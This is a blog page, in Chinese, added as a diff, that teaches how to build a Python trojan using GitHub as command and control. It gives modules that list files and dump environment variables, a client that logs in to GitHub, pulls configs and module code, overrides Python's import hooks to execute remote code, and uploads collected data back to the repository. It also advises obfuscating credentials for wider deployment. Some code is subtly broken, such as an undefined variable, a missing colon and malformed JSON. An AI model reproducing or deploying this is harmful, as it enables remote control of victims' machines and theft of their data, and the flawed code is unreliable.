@@ -1,0 +1,1288 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="WarCup, AI">
+
+
+
+
+
+  <link rel="alternate" href="/public/atom.xml" title="WarCup Blogs" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/uploads/favicon.png?v=5.1.2">
+
+
+
+
+
+
+<meta name="description" content="事前准备 新建如上图片中文件夹，并同步到github。 config目录保存包含对应的每个木马被控端的配置文件。在安装木马的时候，可能需要不同的木马对控端执行不同的任务，这是可以通过修改对应的配置文件来实现。modules目录包含木马被控端所要下载和执行的所有模块代码。我们将修改python导入模块的机制，使得我们的木马可以直接从github的repo中导入python库，就不用下次再编译了。 d">
+<meta name="keywords" content="Information Security, AI, Sociology">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于github的命令和控制">
+<meta property="og:url" content="https://warcup.cn/blogs/2019/09/05/基于github的命令和控制/index.html">
+<meta property="og:site_name" content="WarCup Blogs">
+<meta property="og:description" content="事前准备 新建如上图片中文件夹，并同步到github。 config目录保存包含对应的每个木马被控端的配置文件。在安装木马的时候，可能需要不同的木马对控端执行不同的任务，这是可以通过修改对应的配置文件来实现。modules目录包含木马被控端所要下载和执行的所有模块代码。我们将修改python导入模块的机制，使得我们的木马可以直接从github的repo中导入python库，就不用下次再编译了。 d">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://warcup.cn/blogs/2019/09/05/基于github的命令和控制/C:%5CUsers%5Cliao%5CDocuments%5Cnode%5Cblog%5Csource_posts%5C%E5%9F%BA%E4%BA%8Egithub%E7%9A%84%E5%91%BD%E4%BB%A4%E5%92%8C%E6%8E%A7%E5%88%B6%5C1567686916.png">
+<meta property="og:updated_time" content="2019-09-09T08:06:50.869Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="基于github的命令和控制">
+<meta name="twitter:description" content="事前准备 新建如上图片中文件夹，并同步到github。 config目录保存包含对应的每个木马被控端的配置文件。在安装木马的时候，可能需要不同的木马对控端执行不同的任务，这是可以通过修改对应的配置文件来实现。modules目录包含木马被控端所要下载和执行的所有模块代码。我们将修改python导入模块的机制，使得我们的木马可以直接从github的repo中导入python库，就不用下次再编译了。 d">
+<meta name="twitter:image" content="https://warcup.cn/blogs/2019/09/05/基于github的命令和控制/C:%5CUsers%5Cliao%5CDocuments%5Cnode%5Cblog%5Csource_posts%5C%E5%9F%BA%E4%BA%8Egithub%E7%9A%84%E5%91%BD%E4%BB%A4%E5%92%8C%E6%8E%A7%E5%88%B6%5C1567686916.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="https://warcup.cn/blogs/2019/09/05/基于github的命令和控制/">
+
+
+
+
+
+  <title>基于github的命令和控制 | WarCup Blogs</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <!--  -->
+  <link href="//fonts.googleapis.com/css?family=Kaushan+Script" rel="stylesheet" type="text/css">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+	<a href="https://github.com/warcup" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#fff; color:#151513; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WarCup Blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">What is insistence ? That is day after day, you tell youself to go on for another day.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-photo">
+          <a href="/photo" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-image"></i> <br>
+            
+            相册
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://warcup.cn/blogs/2019/09/05/基于github的命令和控制/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="warcup">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/uploads/avatar_warcup.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WarCup Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">基于github的命令和控制</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-05T19:05:14+08:00">
+                2019-09-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>本文总阅读量
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  1.4k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h1><p><img src="/blogs/2019/09/05/基于github的命令和控制/C:%5CUsers%5Cliao%5CDocuments%5Cnode%5Cblog%5Csource_posts%5C%E5%9F%BA%E4%BA%8Egithub%E7%9A%84%E5%91%BD%E4%BB%A4%E5%92%8C%E6%8E%A7%E5%88%B6%5C1567686916.png" alt="模块名称"></p>
+<p>新建如上图片中文件夹，并同步到github。</p>
+<p>config目录保存包含对应的每个木马被控端的配置文件。在安装木马的时候，可能需要不同的木马对控端执行不同的任务，这是可以通过修改对应的配置文件来实现。modules目录包含木马被控端所要下载和执行的所有模块代码。我们将修改python导入模块的机制，使得我们的木马可以直接从github的repo中导入python库，就不用下次再编译了。</p>
+<p>data目录用来保存木马上传的数据。</p>
+<h1 id="创建模块"><a href="#创建模块" class="headerlink" title="创建模块"></a>创建模块</h1><p>我们在modules里面进行开发，创建一些模块。先新建一个</p>
+<p>dirlister.py：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Run方法 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(**args)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] In dirlister module"</span></span><br><span class="line">    files = os.listdir(<span class="string">"."</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> str(files)</span><br></pre></td></tr></table></figure>
+
+<p>所有的模块都应该有一个统一的run函数，这样做的好处：一是可以是使用相同的方法加载模块，使用接口更加通用；二是提供了充分的可扩展能力。</p>
+<p>environment.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(**args)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] In evnironment module"</span></span><br><span class="line">    <span class="keyword">return</span> str(os.environ)</span><br></pre></td></tr></table></figure>
+
+<h1 id="木马配置"><a href="#木马配置" class="headerlink" title="木马配置"></a>木马配置</h1><p>我们需要对木马分配任务，在一定的时期内完成相应的工作。这意味着我们需要通过一种途径通知木马被控端需要完成什么样的工作及完成这些工作所需要的模块。使用配置文件能满足我们的需求，而且还能根据所需在需要的时候通过定制配置文件提供不同的参数，从而完成不同的任务。而且还能根据需要进行休眠（不分配任何任务）。你可以对安装的每个木马都分配一个唯一的标识符，这样你就可以对安装的每一个木马都分配一个唯一的标识符，这样可以对木马执行返回的数据进行分类，以及控制单个木马执行特定的任务。</p>
+<p>我们配置config目录下的TROJANIN.json文件，并返回一个简单的JSON格式文档，我们可以对它进行解释并换成一个Python形式的字典，然后再使用它。同时，JSON格式的配置文件也非常便与我们对其中的选项进行修改。</p>
+<p>config/abc.json</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="attr">"module"</span>:<span class="string">"dirlister"</span></span><br><span class="line">	&#125;</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="attr">"module"</span>:<span class="string">"environment"</span></span><br><span class="line">	&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<h1 id="编写基于Github通信的木马"><a href="#编写基于Github通信的木马" class="headerlink" title="编写基于Github通信的木马"></a>编写基于Github通信的木马</h1><p>github的木马，它从GitHub上下载配置选项和运行的模块代码。第一步需要做的是编写调用Github API所需要的代码，来实现与github的连接、认证和通行的功能。</p>
+<p>git_trojan.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> imp</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> github3 <span class="keyword">import</span> login</span><br><span class="line"></span><br><span class="line">trojan_id = <span class="string">"abc"</span></span><br><span class="line"></span><br><span class="line">trojan_config = <span class="string">"%s.json"</span> % trojan_id</span><br><span class="line">data_path = <span class="string">"data/%s/"</span> % trojan_id</span><br><span class="line">trojan_modules = []</span><br><span class="line">configured = <span class="literal">False</span></span><br><span class="line">task_queue = Queue.Queue()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect_to_github</span><span class="params">()</span>:</span></span><br><span class="line">    gh = login(username = <span class="string">"youusername"</span>, password = <span class="string">"youpassword"</span>)</span><br><span class="line">    repo = gh.repository(<span class="string">"youusername"</span>, <span class="string">"trojan"</span>)</span><br><span class="line">    branch = repo.branch(<span class="string">"master"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> gh, repo, branch</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_contents</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    gh, repo, branch = connect_to_github()</span><br><span class="line">    tree = branch.commit.commit.tree.recurse()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filename.path:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] Found file %s"</span> % filepath</span><br><span class="line">        blob = repo.blob(filename._json_data[<span class="string">'sha'</span>])</span><br><span class="line">        <span class="keyword">return</span> blob.content</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_trojan_config</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> configured</span><br><span class="line">    config_json = get_file_contents(trojan_config)</span><br><span class="line">    config      = json.loads(base64.b64decode(config_json))</span><br><span class="line">    configured  = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> config:</span><br><span class="line">        <span class="keyword">if</span> task[<span class="string">'module'</span>] <span class="keyword">not</span> <span class="keyword">in</span> sys.modules</span><br><span class="line">            exec(<span class="string">"import %s"</span> % task[<span class="string">'module'</span>])</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store_module_result</span><span class="params">(data)</span>:</span></span><br><span class="line">    gh, repo, branch = connect_to_github()</span><br><span class="line">    remote_path = <span class="string">"data/%s/%d.data"</span> % (trojan_id, random.randint(<span class="number">1000</span>,<span class="number">100000</span>))</span><br><span class="line">    repo.create_file(remote_path, <span class="string">"Commit message"</span>, base64.b64encode(data))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
+
+<p>这四个函数是用来交互的，在真实的场景中，需要对认证函数的代码进行混淆，避免账号口令的泄露。通过访问控制，需要设计每个木马可以有权访问项目中的相应位置，避免木马捕获后，对方可以通过你的账号登录并删除所有数据。get_file_contents 函数从远程repo中抓取文件，然后将文件内容读取到本地的变量中，在读取配置文件和模块的源码时会用到它。</p>
+<p>我们接下来需要破解python模块的导入机制，实现从github的repo中远程导入文件。</p>
+<h1 id="python模块导入功能的破解"><a href="#python模块导入功能的破解" class="headerlink" title="python模块导入功能的破解"></a>python模块导入功能的破解</h1><p>python 允许我们再导入模块的实现过程中插入我们自己的功能函数，如果在本地找不到需要模块，就会调用我们编写的用于导入的类，它允许我们远程获取repo中的模块并导入。</p>
+<p>我们在上面的代码中添加一些内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GitImporter</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.current_module_code = <span class="string">""</span></span><br><span class="line">    <span class="comment"># 获取模块位置    </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_module</span><span class="params">(self, fullname, path = None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> configured:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[*] Attemping to retrieve %s"</span> % fullname</span><br><span class="line">            <span class="comment"># 调用远程文件加载函数</span></span><br><span class="line">            new_library = get_file_contents(<span class="string">"modules/%s"</span> % fullname)</span><br><span class="line">            <span class="comment"># 如果找到了</span></span><br><span class="line">            <span class="keyword">if</span> new_library != <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># base64解密保存</span></span><br><span class="line">                self.current_module_code = base64.b64decode(new_library)    </span><br><span class="line">                <span class="keyword">return</span> self</span><br><span class="line">        <span class="keyword">return</span>  <span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_module</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="comment">#创建本地空对象</span></span><br><span class="line">        module = imp.new_module(name)</span><br><span class="line">        <span class="comment"># 将代码导入这个对象中</span></span><br><span class="line">        <span class="keyword">exec</span> self.current_module_code <span class="keyword">in</span> module.__dict__</span><br><span class="line">        <span class="comment"># 加入到sys.modules列表中</span></span><br><span class="line">        sys.modules[name] = module</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> module</span><br></pre></td></tr></table></figure>
+
+<p>当python解析器尝试加载不存在的模块时，GitImporter类就会被调用。进行查找</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">module_runner</span><span class="params">(module)</span>:</span></span><br><span class="line">    task_queue.put(<span class="number">1</span>)</span><br><span class="line">    result = sys.modules[module].run()</span><br><span class="line">    task_queue.get()</span><br><span class="line">    <span class="comment"># 将结果推送到repo中</span></span><br><span class="line">    store_module_result(result)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="comment"># 木马的主循环</span></span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line">sys.meta_path = [GitImporter()]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> task_queue.empty():</span><br><span class="line">        <span class="comment"># 获取木马配置文件</span></span><br><span class="line">        config   = get_trojan_config()</span><br><span class="line">        <span class="keyword">for</span> task <span class="keyword">in</span> config:</span><br><span class="line">            <span class="comment"># 开启线程</span></span><br><span class="line">            t = threading.Thread(target = module_runner, args = (task[<span class="string">'module'</span>],))</span><br><span class="line">            t.start()</span><br><span class="line">            time.sleep(random.randint(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line">    time.sleep(random.randint(<span class="number">1</span>,<span class="number">10</span>))</span><br></pre></td></tr></table></figure>
+
+<p>这只是一个初步的东西，后续可以对这个命令和控制技术的核心框架进行大量的改进和完善。如果你要在大范围内使用这个木马，还需要实现后端的自动管理，自动上传下载数据、更新配置和木马文件。后续还需要考虑如何让木马加载动态库和编译过的静态库来扩展功能。</p>
+
+      
+	  
+	  
+	  
+		
+  <div class="article_TheEnd">-----本文结束<i class="fa fa-paw"></i>感谢您的阅读-----</div>
+
+	  
+
+    </div>
+    
+    
+    
+
+    
+      <div>
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="/uploads/wechat-qcode.jpg" alt="warcup wechat" style="width: 200px; max-width: 100%;">
+    <div>欢迎扫描二维码关注我的公众号~~~</div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>喜 欢 这 篇 文 章 吗 ？</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/uploads/wechatpay.jpg" alt="warcup WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+<ul class="post-copyright">
+  <li class="post-copyright-title">
+    <strong>本文标题：</strong>
+    基于github的命令和控制
+  </li>
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    warcup
+  </li>
+  <li class="post-copyright-created_at">
+    <strong>发布时间：</strong>
+    2019-09-05
+  </li>
+  <li class="post-copyright-updated_at">
+    <strong>最后更新：</strong>
+    2019-09-09
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://warcup.cn/blogs/2019/09/05/基于github的命令和控制/" title="基于github的命令和控制">https://warcup.cn/blogs/2019/09/05/基于github的命令和控制/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://warcup.cn/blogs/2019/09/05/基于github的命令和控制/" aria-label="复制成功！"></i></span>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({
+          title: "",
+          text: '复制文章链接成功',
+          icon: "success",
+          showConfirmButton: true
+          });
+	    });
+    });  
+</script>
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/03/burp插件/" rel="next" title="burp插件">
+                <i class="fa fa-chevron-left"></i> burp插件
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/09/windows-下木马的常用功能/" rel="prev" title="windows 下木马的常用功能">
+                windows 下木马的常用功能 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
